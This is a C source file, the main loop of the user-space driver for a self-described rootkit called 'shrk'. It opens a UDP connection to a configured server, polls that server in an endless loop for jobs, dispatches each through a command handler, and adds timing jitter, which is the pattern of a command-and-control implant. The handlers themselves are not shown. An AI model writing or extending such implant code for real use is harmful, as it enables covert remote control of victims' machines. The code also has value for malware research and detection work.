#include "inc/client.h"
#include "inc/cmd.h"
#include "inc/job.h"
#include "inc/util.h"

#include <stdbool.h>
#include <strings.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

// clang-format off

/*

 * shrk/user | user binary/driver for the shrk rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

int main() {
  client_t _client, *client = &_client;
  job_t    _job, *job       = &_job;

  // initializtion
  randseed();
  job_new(job, client);

  // setup the UDP client connection (also does address resolving)
  if (client_setup(client, SHRK_SERVER_ADDR, SHRK_SERVER_PORT) < 0) {
    debug("failed to create a connection: %s\n", strerror(errno));
    return EXIT_FAILURE;
  }

  // ask for jobs and handle them
  while (true) {
    if (!job_recv(job, true))
      goto next;

    debug("got a new job (id: %s, command: 0x%02x)", job->id, job->cmd);
    cmd_handle(job);

  next:
    jitter();
  }

  // we are done, free/cleanup stuff
  job_free(job);
  return EXIT_SUCCESS;
}
